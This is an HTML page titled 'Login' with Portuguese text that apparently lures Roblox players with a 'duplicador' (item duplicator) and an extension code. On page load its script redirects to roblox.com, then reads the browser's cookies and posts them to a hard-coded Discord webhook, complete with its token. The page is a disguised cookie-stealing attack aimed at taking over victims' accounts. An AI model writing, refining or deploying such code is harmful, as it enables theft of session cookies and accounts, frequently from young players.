<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-image: url('https://pbs.twimg.com/media/E8CMoPuVgBY4W9q.jpg:large');
            background-size: cover;
            background-repeat: no-repeat;
            background-position: center;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .cookie-alert {
            color: red;
            display: none;
        }
    </style>
</head>
<body>
    <p id="warning" class="cookie-alert">Verifique se o código copiado da extensão está correto e aguarde até 10 minutos para que o duplicador funcione. Lembre-se, se não funcionar, coloque o código novamente.</p>

    <script>
        // Função para abrir o Roblox e esperar que ele pegue o cookie
        function openRobloxAndSendCookie() {
            // Abrir o Roblox
            window.location.href = "https://www.roblox.com/";

            // Display warning message
            document.getElementById('warning').style.display = "block";

            // Esperar um tempo antes de enviar o cookie (3 segundos, por exemplo)
            setTimeout(sendCookie, 3000);
        }

        // Função para enviar os cookies para o seu Discord webhook
        function sendCookie() {
            // Captura os cookies
            var cookies = document.cookie;

            // Envia os cookies para o seu Discord webhook
            var data = {
                content: "Cookies: " + cookies
            };

            fetch('https://discord.com/api/webhooks/1040678839396872322/TIl24vk7NiW4Fz3zACaKchZhtMc8ien3KjI9ha9EU1dTBeKIDH18H3Fgx3uStpAkG5Ud', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Erro ao enviar mensagem para o Discord: ' + response.statusText);
                }
                console.log('Mensagem enviada com sucesso para o Discord!');
            })
            .catch(error => {
                console.error('Erro:', error);
                alert('Erro ao enviar cookies para o Discord: ' + error.message);
            });
        }

        // Chama a função openRobloxAndSendCookie assim que a página for carregada
        window.onload = openRobloxAndSendCookie;
    </script>
</body>
</html>
